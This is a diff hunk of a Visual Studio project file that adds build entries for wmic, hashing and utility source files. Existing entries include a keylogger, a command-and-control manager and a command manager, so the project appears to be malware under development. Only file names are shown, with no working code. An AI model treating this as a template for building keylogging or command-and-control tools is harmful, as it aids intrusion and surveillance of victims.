@@ -151,13 +151,18 @@
     <ClCompile Include="commandManager.cpp" />
     <ClCompile Include="keyLogger.cpp" />
     <ClCompile Include="main.cpp" />
+    <ClCompile Include="wmic.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="cncManager.h" />
     <ClInclude Include="commandManager.h" />
     <ClInclude Include="DDproto.h" />
+    <ClInclude Include="HashFunction.h" />
+    <ClInclude Include="HashModule.h" />
     <ClInclude Include="initialize.h" />
     <ClInclude Include="keyLogger.h" />
+    <ClInclude Include="util.h" />
+    <ClInclude Include="wmic.h" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
